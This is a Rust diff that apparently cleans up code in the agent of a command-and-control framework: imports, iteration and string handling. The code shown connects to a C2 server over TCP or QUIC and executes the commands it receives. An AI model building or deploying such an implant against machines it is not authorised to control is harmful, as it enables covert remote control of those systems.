@@ -2,9 +2,8 @@
 
 use std::sync::{Arc, RwLock};
 
-use anyhow::{bail, Result};
+use anyhow::{Result};
 use commands::Commands;
-use futures_util::sink::SinkExt;
 use rast::{
     encoding::{Encoding, JsonPackager, Packager},
     messages::{AgentInit, Message, MessageZone},
@@ -17,7 +16,7 @@ use tracing::{debug, info, trace};
 use ulid::Ulid;
 
 use crate::{
-    commands::{Command, CommandOutput},
+    commands::{CommandOutput},
     context::Context,
     messages::{AgentResponse, C2Request},
 };
@@ -49,11 +48,10 @@ impl RastAgent {
     }
 
     async fn get_connection(settings: &Settings) -> Result<Arc<Mutex<dyn ProtoConnection>>> {
-        for conf in settings.agent.connections.iter() {
+        for conf in &settings.agent.connections {
             let conn = match conf {
                 Connection::Tcp(tcp_conf) => TcpFactory::new_connection(tcp_conf).await,
                 Connection::Quic(quic_conf) => QuicFactory::new_connection(quic_conf).await,
-                _ => bail!(RastError::Unknown),
             };
 
             if let Ok(conn) = conn {
@@ -118,10 +116,10 @@ impl RastAgent {
     async fn handle_message(&self, msg: C2Request) -> Result<AgentResponse, RastError> {
         let response = match msg {
             C2Request::ExecCommand(cmd, args) => {
-                if let Some(cmd) = self.commands.get_command(cmd) {
+                if let Some(cmd) = self.commands.get_command(&cmd) {
                     let output = cmd.execute(self.context.clone(), args).await?;
                     let output = match output {
-                        CommandOutput::Nothing => "".to_string(),
+                        CommandOutput::Nothing => String::new(),
                         CommandOutput::Text(txt) => txt,
                         CommandOutput::ListOfText(txts) => txts.join("\n"),
                     };
